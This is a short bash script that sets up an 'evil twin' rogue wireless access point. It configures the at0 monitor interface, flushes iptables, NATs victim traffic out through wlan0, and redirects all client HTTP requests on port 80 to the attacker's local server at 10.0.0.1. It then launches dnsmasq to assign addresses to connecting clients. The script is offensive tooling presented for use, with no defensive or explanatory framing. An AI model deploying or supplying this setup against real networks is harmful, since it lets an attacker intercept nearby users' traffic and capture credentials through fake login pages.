#! /bin/bash

# this script sets up the dns server and bridging the monitor device to the internet connected device
BRIDGE=wlan0			# the device connected to internet to be bridged, could be eth0, wlan0, wlan1

# Give the evil twin can access the internet.
echo -e "Configuring at0 interface"
ifconfig at0

# give at0 an ip address: 
ifconfig at0 10.0.0.1 up

# route all traffic through at0
echo -e "Bridging wireless $BRIDGE"
iptables --flush
iptables --table nat --append POSTROUTING --out-interface $BRIDGE -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A PREROUTING -j MASQUERADE

# enable port forwarding: 
echo -e "Enabling port forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

# evil twin is now setup, now need to allocate ip addresses to clients
dnsmasq -C config/dnsmasq.conf -d
